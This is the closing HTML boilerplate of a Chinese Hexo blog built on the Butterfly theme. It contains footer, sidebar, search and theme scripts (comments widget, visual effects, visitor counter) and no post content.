datetime="2024-12-31T12:34:30.170Z" title="发表于 2024-12-31 20:34:30">2024-12-31</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/baobao.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025  <i id="heartbeat" class="fa fas fa-heartbeat"></i> w3nx1z1</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div><link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'ZClYARR22ZvT2ZwatJZ1136e-MdYXbMMI',
+      appKey: '7gejDss3xmCS5jmSo6PpiX2z',
+      avatar: 'monsterid',
+      serverURLs: 'https://zclyarr2.api.lncldglobal.com',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
